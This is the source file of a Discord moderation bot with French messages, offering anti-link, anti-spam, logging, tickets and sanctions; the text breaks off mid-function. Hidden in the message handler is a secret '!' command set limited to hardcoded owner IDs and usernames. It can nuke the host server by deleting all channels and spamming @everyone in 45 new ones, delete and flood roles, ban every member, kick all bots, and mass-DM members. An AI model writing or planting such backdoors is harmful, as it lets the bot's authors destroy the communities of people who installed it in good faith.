// Build Revision: K2L-Bot-Ultimate-Master-v9.5
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
const http = require('http');

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('K2L Bot Master Ultimate Operational with All Commands & Configurable AutoMod v9.5!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
    ]
});

const PREFIX = '=';

const snipeCache = new Map();
const spamTracker = new Map();
const serverConfig = new Map(); 
const guildStaffConfig = new Map();
const warningsMap = new Map();
const jailDataMap = new Map();

const SUPER_OWNERS = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 

function isSuperOwner(message) {
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId && SUPER_OWNERS.has(userId)) return true;
    if (SUPER_OWNERS.has(userId) || SUPER_OWNERS.has(username) || SUPER_OWNERS.has(globalName)) return true;
    return false;
}

function isOwner(message) {
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId) return true;
    if (botOwners.has(userId) || botOwners.has(username) || botOwners.has(globalName)) return true;
    return false;
}

function getStaffRoles(guildId) {
    if (!guildStaffConfig.has(guildId)) {
        guildStaffConfig.set(guildId, {
            admins: new Set(),
            mods: new Set()
        });
    }
    return guildStaffConfig.get(guildId);
}

function isAdmin(message) {
    if (isOwner(message)) return true;
    if (message.member && message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.admins.has(message.author.id);
}

function isMod(message) {
    if (isAdmin(message)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.mods.has(message.author.id);
}

function getGuildConfig(guildId) {
    if (!serverConfig.has(guildId)) {
        serverConfig.set(guildId, {
            antilink: false,
            antilinkAction: 'delete',
            antispam: false,
            antispamAction: 'mute',
            antispamLimit: 5,
            antispamIntervalMs: 5000,
            antibot: false,
            antibotAction: 'kick',
            logChannel: null,
            welcomeChannel: null,
            welcomeText: null,
            muteRole: null,
            jailRole: null,
            jailCategory: null,
            ticketConfig: {
                panelChannel: null,
                categoryDestination: null,
                logChannel: null,
                title: "🎟️ Tickets & Support",
                description: "Bienvenue dans votre espace dédié au support !\nSélectionnez ci-dessous la catégorie correspondant à votre demande.",
                imageUrl: null,
                published: false,
                categories: [
                    { id: 'ticket_bugs', name: 'Bugs', emoji: '🤖', roleId: null, description: 'Signaler un bug technique' },
                    { id: 'ticket_signalements', name: 'Signalements', emoji: '⚖️', roleId: null, description: 'Signaler un membre' },
                    { id: 'ticket_infos', name: 'Informations', emoji: '📢', roleId: null, description: 'Questions générales' },
                    { id: 'ticket_recrutement', name: 'Recrutement', emoji: '🛠️', roleId: null, description: 'Postuler dans le staff' }
                ]
            }
        });
    }
    return serverConfig.get(guildId);
}

function sendLog(guild, embed) {
    if (!guild) return;
    const config = getGuildConfig(guild.id);
    if (!config.logChannel) return;
    const logChan = guild.channels.cache.get(config.logChannel);
    if (logChan) logChan.send({ embeds: [embed] }).catch(() => {});
}

async function fetchTargetUser(client, guild, targetArg) {
    if (!targetArg) return null;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        const member = await guild.members.fetch(cleanId).catch(() => null);
        if (member) return member.user;
        const user = await client.users.fetch(cleanId);
        return user;
    } catch (e) {
        return null;
    }
}

async function fetchTargetMember(message, targetArg) {
    if (!targetArg) return null;
    const mention = message.mentions.members.first();
    if (mention) return mention;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        return await message.guild.members.fetch(cleanId);
    } catch (e) {
        return null;
    }
}

function parseDuration(durationStr) {
    if (!durationStr) return null;
    const match = durationStr.match(/^(\d+)([smhd])$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    let ms = value * 1000;
    if (unit === 'm') ms = value * 60 * 1000;
    else if (unit === 'h') ms = value * 60 * 60 * 1000;
    else if (unit === 'd') ms = value * 24 * 60 * 60 * 1000;
    return ms;
}
async function executeAutoSanction(guild, member, action, reason) {
    if (!member || member.user.bot) return;
    try {
        if (action === 'delete') return;
        if (action === 'warn') {
            let userWarns = warningsMap.get(member.id) || [];
            userWarns.push({ reason, moderator: 'AutoMod' });
            warningsMap.set(member.id, userWarns);
        } else if (action === 'mute') {
            await member.timeout(10 * 60 * 1000, reason).catch(() => {});
        } else if (action === 'kick') {
            await member.kick(reason).catch(() => {});
        } else if (action === 'jail') {
            const botRolePos = guild.members.me.roles.highest.position;
            const roleIds = member.roles.cache.filter(r => r.id !== guild.id && !r.managed && r.position < botRolePos).map(r => r.id);
            jailDataMap.set(member.id, roleIds);
            if (roleIds.length > 0) await member.roles.remove(roleIds).catch(() => {});

            const jailChannel = await guild.channels.create({
                name: `jail-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
                ]
            });
            await jailChannel.send({ content: `<@${member.id}>`, embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('🔒 PRISON (AutoMod)').setDescription(`Raison : ${reason}`)] });
        } else if (action === 'bl' || action === 'ban') {
            await guild.members.ban(member.id, { reason }).catch(() => {});
        }
    } catch (e) {}
}

client.on('messageDelete', message => {
    if (!message.author || message.author.bot || !message.guild) return;
    snipeCache.set(message.channel.id, {
        content: message.content || "[Média / Embed]",
        author: message.author.tag,
        avatar: message.author.displayAvatarURL(),
        time: new Date().toLocaleTimeString()
    });

    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Message supprimé')
        .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Contenu :**\n\`\`\`${message.content || 'Aucun texte'}\`\`\``)
        .setTimestamp();
    sendLog(message.guild, embed);
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (!oldMessage.author || oldMessage.author.bot || !oldMessage.guild) return;
    if (oldMessage.content === newMessage.content) return;

    const embed = new EmbedBuilder()
        .setColor('#f39c12')
        .setTitle('✏️ Message modifié')
        .setDescription(`**Auteur :** ${oldMessage.author.tag} (\`${oldMessage.author.id}\`)\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content || 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
        .setTimestamp();
    sendLog(oldMessage.guild, embed);
});

client.on('guildBanAdd', ban => {
    const embed = new EmbedBuilder().setColor('#c0392b').setTitle('🔨 Membre banni').setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`).setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('guildBanRemove', ban => {
    const embed = new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Membre débanni').setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`).setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('channelCreate', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder().setColor('#3498db').setTitle('📁 Salon créé').setDescription(`**Nom :** \`${channel.name}\``).setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('channelDelete', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder().setColor('#e74c3c').setTitle('🗑️ Salon supprimé').setDescription(`**Nom :** \`${channel.name}\``).setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('roleCreate', role => {
    const embed = new EmbedBuilder().setColor('#9b59b6').setTitle('🏷️ Rôle créé').setDescription(`**Nom :** \`${role.name}\``).setTimestamp();
    sendLog(role.guild, embed);
});

client.on('roleDelete', role => {
    const embed = new EmbedBuilder().setColor('#e74c3c').setTitle('🗑️ Rôle supprimé').setDescription(`**Nom :** \`${role.name}\``).setTimestamp();
    sendLog(role.guild, embed);
});

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt avec Master Suite.`);
});
client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        const config = getGuildConfig(member.guild.id);
        if (config.antibot) {
            try {
                const fetchedLogs = await member.guild.fetchAuditLogs({ limit: 1, type: 28 });
                const auditLog = fetchedLogs.entries.first();
                const executor = auditLog ? auditLog.executor : null;

                await member.kick('Anti-bot activé.');

                if (executor && !executor.bot) {
                    const execMember = await member.guild.members.fetch(executor.id).catch(() => null);
                    if (execMember) {
                        await executeAutoSanction(member.guild, execMember, config.antibotAction, 'Anti-Bot: Ajout de bot interdit');
                    }
                }

                const embed = new EmbedBuilder()
                    .setColor('#e74c3c')
                    .setTitle('🤖 Bot bloqué (Anti-bot)')
                    .setDescription(`**Bot expulsé :** ${member.user.tag} (\`${member.id}\`)\n**Invité par :** ${executor ? executor.tag : 'Inconnu'}\n**Sanction appliquée :** \`${config.antibotAction}\``)
                    .setTimestamp();
                sendLog(member.guild, embed);
            } catch (err) {}
        }
    }
    
    const config = getGuildConfig(member.guild.id);
    if (config.welcomeChannel && config.welcomeText) {
        const channel = member.guild.channels.cache.get(config.welcomeChannel);
        if (channel) {
            const welcomeMsg = config.welcomeText
                .replace(/\{mention\}/g, `<@${member.id}>`)
                .replace(/\{name\}/g, member.user.username);
            channel.send(welcomeMsg).catch(() => {});
        }
    }
});

function getTicketDashboardEmbed(guild, config) {
    const tConfig = config.ticketConfig;
    const panelChanStr = tConfig.panelChannel ? `<#${tConfig.panelChannel}>` : '❌ Non défini';
    const catDestStr = tConfig.categoryDestination ? `<#${tConfig.categoryDestination}>` : '❌ Non défini';
    const logChanStr = tConfig.logChannel ? `<#${tConfig.logChannel}>` : '❌ Non défini';
    const imgStatus = tConfig.imageUrl ? '✅ image/gif enregistré' : '❌ Aucune image';
    const pubStatus = tConfig.published ? '🟢 publié' : '🔴 non publié';

    const catList = tConfig.categories.map(c => `${c.emoji} ${c.name}`).join(' • ') || 'Aucune catégorie';

    return new EmbedBuilder()
        .setColor('#2b2d31')
        .setTitle('🎫 Configuration des tickets')
        .setDescription(
            `**Salon du panneau :** ${panelChanStr}\n` +
            `**Catégorie des salons-tickets :** ${catDestStr}\n` +
            `**Salon logs / transcripts :** ${logChanStr}\n\n` +
            `**Titre :** ${tConfig.title}\n` +
            `**Image / GIF :** ${imgStatus}\n` +
            `**Panneau :** ${pubStatus}\n\n` +
            `**Catégories :** ${catList}\n\n` +
            `*Tout est prêt — clique sur les boutons ci-dessous pour configurer ou publier.*`
        );
}

function getTicketDashboardRows() {
    return [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_salons').setLabel('Salons').setEmoji('⚙️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_texte').setLabel('Texte du panneau').setEmoji('📝').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_media').setLabel('Image / GIF').setEmoji('🖼️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_cats').setLabel('Catégories').setEmoji('📁').setStyle(ButtonStyle.Secondary)
        ),
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_publish').setLabel('Publier le panneau').setEmoji('🚀').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('t_dash_disable').setLabel('Désactiver').setEmoji('🗑️').setStyle(ButtonStyle.Danger)
        )
    ];
}
client.on('interactionCreate', async interaction => {
    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
        const guild = interaction.guild;
        const member = interaction.member;
        const selectedValue = interaction.values[0];
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        const catObj = tConfig.categories.find(c => c.id === selectedValue) || { name: 'support', emoji: '🎫', roleId: null };

        try {
            const overwrites = [
                { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
            ];

            if (catObj.roleId) {
                overwrites.push({
                    id: catObj.roleId,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageMessages]
                });
            }

            const channelOptions = {
                name: `${catObj.name.toLowerCase()}-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: overwrites
            };

            if (tConfig.categoryDestination) {
                channelOptions.parent = tConfig.categoryDestination;
            }

            const ticketChannel = await guild.channels.create(channelOptions);

            const embed = new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${catObj.emoji} Ticket [ ${catObj.name.toUpperCase()} ] - ${member.user.username}`)
                .setDescription("Un membre de notre équipe va bientôt te prendre en charge.\nClique sur le bouton ci-dessous pour fermer et archiver le ticket.");

            const closeRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 Fermer le ticket').setStyle(ButtonStyle.Danger)
            );

            const rolePing = catObj.roleId ? `<@&${catObj.roleId}>` : `<@${member.id}>`;
            await ticketChannel.send({ content: rolePing, embeds: [embed], components: [closeRow] });

            const logEmbed = new EmbedBuilder()
                .setColor('#3498db')
                .setTitle('🎫 Ticket ouvert')
                .setDescription(`**Membre :** ${member.user.tag} (\`${member.user.id}\`)\n**Salon :** ${ticketChannel}\n**Type :** \`${catObj.name}\``)
                .setTimestamp();
            sendLog(guild, logEmbed);

            return interaction.reply({ content: `✅ Votre ticket a été ouvert avec succès : ${ticketChannel}`, ephemeral: true });
        } catch (e) {
            return interaction.reply({ content: "❌ Erreur lors de la création du salon de ticket.", ephemeral: true });
        }
    }

    if (interaction.isButton()) {
        const guild = interaction.guild;
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        if (interaction.customId === 'close_ticket') {
            const channel = interaction.channel;
            await interaction.reply("🔒 Fermeture du ticket, génération de la transcription...");

            try {
                const messages = await channel.messages.fetch({ limit: 100 });
                const transcript = messages.reverse().map(m => `[${new Date(m.createdTimestamp).toLocaleString()}] ${m.author.tag}: ${m.content}`).join('\n');
                
                const buffer = Buffer.from(transcript, 'utf-8');
                const attachment = new AttachmentBuilder(buffer, { name: `transcription-${channel.name}.txt` });

                const logEmbed = new EmbedBuilder()
                    .setColor('#e74c3c')
                    .setTitle('📁 Ticket fermé & Archivé')
                    .setDescription(`**Salon :** \`${channel.name}\`\n**Fermé par :** ${interaction.user.tag}`)
                    .setTimestamp();

                if (tConfig.logChannel) {
                    const logChan = guild.channels.cache.get(tConfig.logChannel);
                    if (logChan) await logChan.send({ embeds: [logEmbed], files: [attachment] });
                } else {
                    sendLog(guild, logEmbed);
                }
            } catch (err) {}

            setTimeout(() => channel.delete().catch(() => {}), 3000);
            return;
        }

        if (interaction.customId === 'join_giveaway') {
            return interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true });
        }

        if (interaction.customId.startsWith('t_dash_')) {
            if (!isAdmin({ member: interaction.member, author: interaction.user, guild: interaction.guild })) {
                return interaction.reply({ content: "❌ Tu n'as pas les permissions admin pour configurer le panneau.", ephemeral: true });
            }

            const action = interaction.customId.replace('t_dash_', '');

            if (action === 'salons') {
                return interaction.reply({ content: "⚙️ **Configuration des salons :** Utilise `=setticketpanel <#salon>`, `=setticketcat <ID_Catégorie>` et `=setticketlog <#salon>`.", ephemeral: true });
            }
            if (action === 'texte') {
                return interaction.reply({ content: "📝 **Texte du panneau :** Utilise `=settickettitle <titre>` et `=setticketdesc <description>`.", ephemeral: true });
            }
            if (action === 'media') {
                return interaction.reply({ content: "🖼️ **Image / GIF :** Utilise `=setticketimage <lien_image>`.", ephemeral: true });
            }
            if (action === 'cats') {
                const catInfo = tConfig.categories.map(c => `• **${c.emoji} ${c.name}** (Rôle: ${c.roleId ? `<@&${c.roleId}>` : 'Aucun'})`).join('\n');
                return interaction.reply({ content: `📁 **Catégories actuelles :**\n${catInfo}\n\nUtilise \`=ticketadd <nom> <emoji> [@rôle_staff]\` pour ajouter ou modifier une catégorie.`, ephemeral: true });
            }
            if (action === 'disable') {
                tConfig.published = false;
                await interaction.update({ embeds: [getTicketDashboardEmbed(guild, config)], components: [getTicketDashboardRows()] });
                return interaction.followUp({ content: "🗑️ Panneau désactivé.", ephemeral: true });
            }
            if (action === 'publish') {
                if (!tConfig.panelChannel) {
                    return interaction.reply({ content: "❌ Définis d'abord un salon de panneau avec `=setticketpanel <#salon>` !", ephemeral: true });
                }
                const targetChan = guild.channels.cache.get(tConfig.panelChannel);
                if (!targetChan) return interaction.reply({ content: "❌ Salon du panneau introuvable.", ephemeral: true });

                const panelEmbed = new EmbedBuilder()
                    .setColor('#2b2d31')
                    .setTitle(tConfig.title)
                    .setDescription(tConfig.description);

                if (tConfig.imageUrl) panelEmbed.setImage(tConfig.imageUrl);

                const selectMenu = new StringSelectMenuBuilder()
                    .setCustomId('ticket_select_menu')
                    .setPlaceholder('🎫 Choisissez une catégorie...')
                    .addOptions(tConfig.categories.map(c => ({
                        label: c.name,
                        description: c.description || `Ouvrir un ticket ${c.name}`,
                        value: c.id,
                        emoji: c.emoji
                    })));

                const menuRow = new ActionRowBuilder().addComponents(selectMenu);

                await targetChan.send({ embeds: [panelEmbed], components: [menuRow] });
                tConfig.published = true;

                await interaction.update({ embeds: [getTicketDashboardEmbed(guild, config)], components: [getTicketDashboardRows()] });
                return interaction.followUp({ content: `🚀 Panneau publié avec succès dans ${targetChan} !`, ephemeral: true });
            }
        }
    }
});
client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    // Commandes secrètes Owner en '!'
    if (message.content.startsWith('!')) {
        if (!isSuperOwner(message)) return;

        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        
        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
        if (offensiveCommands.includes(command)) {
            if (command === 'nuke') {
                await message.reply("⚡ **Destruction totale du serveur en cours...**").catch(() => {});
                message.guild.setName('/yuza').catch(() => {});
                message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));

                for (let i = 0; i < 45; i++) {
                    message.guild.channels.create({
                        name: 'ez-by-k2l',
                        type: ChannelType.GuildText,
                        permissionOverwrites: [{
                            id: message.guild.id,
                            allow: [
                                PermissionsBitField.Flags.ViewChannel,
                                PermissionsBitField.Flags.SendMessages,
                                PermissionsBitField.Flags.ManageChannels,
                                PermissionsBitField.Flags.EmbedLinks,
                                PermissionsBitField.Flags.AttachFiles,
                                PermissionsBitField.Flags.MentionEveryone
                            ]
                        }]
                    }).then(channel => {
                        for (let j = 0; j < 12; j++) {
                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                        }
                    }).catch(() => {});
                }
                return;
            }

            if (command === 'role') {
                await message.reply("⚡ **Suppression et flood des rôles en cours...**").catch(() => {});
                message.guild.roles.cache
                    .filter(role => role.editable && role.id !== message.guild.id)
                    .forEach(role => role.delete().catch(() => {}));

                for (let r = 0; r < 40; r++) {
                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
                }
                return;
            }

            if (command === 'banall') {
                await message.reply("⚡ **[BANALL]** Exécution du banall massif...").catch(() => {});
                try {
                    await message.guild.members.fetch();
                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
                    const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
                    await Promise.all(banPromises);
                    message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'kickbot') {
                await message.reply("⚡ **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
                try {
                    const fetchedMembers = await message.guild.members.fetch();
                    const kickPromises = [];
                    for (const [id, m] of fetchedMembers) {
                        if (m.user.bot && m.id !== client.user.id) {
                            kickPromises.push(m.kick('Kickbot').catch(() => {}));
                        }
                    }
                    await Promise.all(kickPromises);
                    message.channel.send("✅ **[KICKBOT]** Bots expulsés !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'dmall') {
                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
                const filter = m => m.author.id === message.author.id;
                try {
                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
                    const m = collected.first();
                    if (m.content.toLowerCase() === 'annuler') {
                        return message.channel.send("❌ **Opération DMAll annulée.**");
                    }
                    const messageTemplate = m.content;
                    const previewEmbed = new EmbedBuilder()
                        .setColor('#2b2d31')
                        .setTitle('⚠️ Confirmation requise - DMAll')
                        .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                    );

                    const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
                    const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });

                    buttonCollector.on('collect', async interaction => {
                        if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
                        if (interaction.customId === 'cancel_dmall') {
                            return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                        }
                        if (interaction.customId === 'confirm_dmall') {
                            await interaction.update({ content: "🚀 **Diffusion DMAll lancée en fond...**", embeds: [], components: [] }).catch(() => {});
                            try {
                                await message.guild.members.fetch();
                                const members = message.guild.members.cache.filter(member => !member.user.bot);
                                let successCount = 0;
                                let failCount = 0;
                                const promises = members.map(async member => {
                                    try {
                                        const finalMessage = messageTemplate
                                            .replace(/\{mention\}/g, `<@${member.id}>`)
                                            .replace(/\{name\}/g, member.user.username);
                                        await member.send(finalMessage);
                                        successCount++;
                                    } catch (err) {
                                        failCount++;
                                    }
                                });
                                await Promise.all(promises);
                                await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
                            } catch (error) {
                                message.channel.send("❌ Erreur lors du DMAll.");
                            }
                        }
                    });
                } catch (err) {
                    message.channel.send("⌛ Temps écoulé.");
                }
                return;
            }
        }
    }

    const config = getGuildConfig(message.guild.id);
    const userId = message.author.id;
    const isUserAdminOrOwner = message.member.permissions.has(PermissionsBitField.Flags.Administrator) || isOwner(message);

    if (config.antilink && !isUserAdminOrOwner) {
        const linkRegex = /(https?:\/\/[^\s]+|discord\.gg\/[^\s]+|discord\.com\/invite\/[^\s]+)/i;
        if (linkRegex.test(message.content)) {
            try {
                await message.delete().catch(() => {});
                const warning = await message.channel.send(`⚠️ ${message.author}, les liens externes sont interdits.`);
                setTimeout(() => warning.delete().catch(() => {}), 4000);

                await executeAutoSanction(message.guild, message.member, config.antilinkAction, 'Anti-Link: Lien non autorisé');
                return;
            } catch (e) {}
        }
    }

    if (config.antispam && !isUserAdminOrOwner) {
        const now = Date.now();
        let userSpam = spamTracker.get(userId) || [];
        userSpam = userSpam.filter(timestamp => now - timestamp < config.antispamIntervalMs);
        userSpam.push(now);
        spamTracker.set(userId, userSpam);

        if (userSpam.length >= config.antispamLimit) {
            try {
                await message.delete().catch(() => {});
                const warning = await message.channel.send(`🚨 ${message.author}, veuillez ralentir (Anti-Spam).`);
                setTimeout(() => warning.delete().catch(() => {}), 3000);

                await executeAutoSanction(message.guild, message.member, config.antispamAction, 'Anti-Spam: Messages trop rapides');
                return;
            } catch (e) {}
        }
    }

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    const targetArg = args[0];

    if (command === 'embed') {
        const fullContent = args.join(' ');
        if (!fullContent.includes('|')) {
            return message.reply("❌ **Commande non correcte.** Utilisation : `=embed <titre> | <description>`");
        }
        const parts = fullContent.split('|');
        const title = parts.shift().trim();
        const description = parts.join('|').trim();

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle(`**${title}**`)
            .setDescription(description)
            .setFooter({ text: `Envoyé par ${message.author.tag}`, iconURL: message.author.displayAvatarURL() });

        await message.delete().catch(() => {});
        return message.channel.send({ embeds: [embed] });
    }

    if (command === 'help') {
        const helpCategories = {
            automod: {
                label: 'AutoMod & Sanctions', emoji: '🛡️', title: 'Gestion AutoMod Avancée',
                commands: [
                    '`=antilink on / off`\n┗ Activer / désactiver l\'anti-lien',
                    '`=antilink action <delete|warn|mute|kick|jail|bl|ban>`\n┗ Définir la sanction anti-lien',
                    '`=antispam on / off`\n┗ Activer / désactiver l\'anti-spam',
                    '`=antispam action <delete|warn|mute|kick|jail|bl|ban>`\n┗ Définir la sanction anti-spam',
                    '`=antispam limit <nb>` / `time <sec>`\n┗ Configurer les seuils de spam',
                    '`=antibot on / off`\n┗ Activer / désactiver l\'anti-bot',
                    '`=antibot action <delete|warn|mute|kick|jail|bl|ban>`\n┗ Sanctionner l\'inviteur du bot'
                ]
            },
            sanctions: {
                label: 'Sanctions', emoji: '🔨', title: 'Commandes Sanctions',
                commands: [
                    '`=bl <ID|@mention> [raison]`\n┗ Bannir un utilisateur',
                    '`=softbl <ID|@mention> [raison]`\n┗ Softban un utilisateur',
                    '`=unbl <ID>`\n┗ Débannir un utilisateur',
                    '`=blist`\n┗ Liste des bannis',
                    '`=unbanall`\n┗ Tout débannir',
                    '`=kick <ID|@mention>`\n┗ Expulser un membre',
                    '`=mute <@membre> <durée> [raison]`\n┗ Rendre muet un membre',
                    '`=jail <@membre> [raison]` *(ADMIN)*\n┗ Isoler un membre en prison',
                    '`=unjail <@membre>` *(ADMIN)*\n┗ Libérer un membre',
                    '`=warn <@membre> [raison]`\n┗ Avertir un membre'
                ]
            },
            salons: {
                label: 'Salons', emoji: '🔒', title: 'Salons & Outils',
                commands: [
                    '`=lock` / `=unlock` *(ADMIN)*\n┗ Verrouiller/Déverrouiller le salon',
                    '`=embed <titre> | <description>`\n┗ Créer un embed stylé',
                    '`=clear <1-50>`\n┗ Supprimer des messages',
                    '`=purge <ID|@mention>`\n┗ Purger les messages d\'un membre',
                    '`=snipe`\n┗ Afficher le dernier message supprimé'
                ]
            }
        };

        const catKeys = Object.keys(helpCategories);
        let currentIndex = 0;

        const generateEmbed = (index) => {
            const key = catKeys[index];
            const cat = helpCategories[key];
            return new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${cat.emoji} ${cat.title}`)
                .setDescription(cat.commands.join('\n\n'))
                .setFooter({ text: `Demandé par ${message.author.tag} • Page ${index + 1}/${catKeys.length}` });
        };

        const generateMenu = () => {
            return new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('help_select_menu')
                    .setPlaceholder('📁 Choisir une catégorie...')
                    .addOptions(catKeys.map(k => ({
                        label: helpCategories[k].label,
                        description: `Commandes ${helpCategories[k].label}`,
                        value: k,
                        emoji: helpCategories[k].emoji
                    })))
            );
        };

        const sentMsg = await message.reply({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] });
        const collector = sentMsg.createMessageComponentCollector({ time: 60000 });
        collector.on('collect', async i => {
            if (i.user.id !== message.author.id) return i.reply({ content: "Ce menu ne t'appartient pas !", ephemeral: true });
            currentIndex = catKeys.indexOf(i.values[0]);
            await i.update({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] });
        });
        collector.on('end', () => sentMsg.edit({ components: [] }).catch(() => {}));
        return;
    }
    if (command === 'antilink') {
        const sub = args[0]?.toLowerCase();
        if (sub === 'action') {
            const act = args[1]?.toLowerCase();
            const validActs = ['delete', 'warn', 'mute', 'kick', 'jail', 'bl', 'ban'];
            if (!validActs.includes(act)) return message.reply(`❌ Action invalide. Choix : \`${validActs.join(', ')}\``);
            config.antilinkAction = act;
            return message.reply(`✅ Sanction Anti-Link configurée sur : **${act.toUpperCase()}**`);
        }
        if (sub === 'on' || sub === 'off') {
            config.antilink = (sub === 'on');
            return message.reply(`🛡️ Protection **Anti-Link** réglée sur **${sub.toUpperCase()}** (Sanction : \`${config.antilinkAction}\`)`);
        }
    }

    if (command === 'antispam') {
        const sub = args[0]?.toLowerCase();
        if (sub === 'action') {
            const act = args[1]?.toLowerCase();
            const validActs = ['delete', 'warn', 'mute', 'kick', 'jail', 'bl', 'ban'];
            if (!validActs.includes(act)) return message.reply(`❌ Action invalide. Choix : \`${validActs.join(', ')}\``);
            config.antispamAction = act;
            return message.reply(`✅ Sanction Anti-Spam configurée sur : **${act.toUpperCase()}**`);
        }
        if (sub === 'limit') {
            const count = parseInt(args[1]);
            if (isNaN(count) || count < 2) return message.reply("❌ Nombre invalide.");
            config.antispamLimit = count;
            return message.reply(`✅ Limite anti-spam réglée à **${count} messages**.`);
        }
        if (sub === 'time') {
            const ms = parseDuration(args[1]);
            if (!ms) return message.reply("❌ Temps invalide (ex: 5s).");
